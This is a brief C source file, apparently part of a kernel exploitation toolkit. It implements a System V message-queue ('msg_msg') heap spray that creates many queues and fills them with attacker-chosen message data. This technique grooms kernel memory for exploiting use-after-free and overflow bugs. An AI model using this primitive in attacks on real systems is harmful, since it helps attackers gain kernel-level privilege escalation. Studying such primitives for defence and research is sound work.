#include "msg_msg.h"

int msg_msg_alloc(int msqid, void *buf, size_t size, long type) {
    struct {
        long mtype;
        char mtext[size];
    } msg;

    msg.mtype = type;
    memcpy(msg.mtext, buf, size);

    if (msgsnd(msqid, &msg, size, 0) == -1) {
        return -1;
    }
    return 0;
}

int msg_msg_spray(int num_queues, int num_msgs, size_t size, long type) {
    int msqids[num_queues];
    char buf[size];
    memset(buf, 'A', size);

    for (int i = 0; i < num_queues; i++) {
        msqids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msqids[i] == -1) return -1;

        for (int j = 0; j < num_msgs; j++) {
            if (msg_msg_alloc(msqids[i], buf, size, type) == -1) {
                return -1;
            }
        }
    }
    return 0;
}
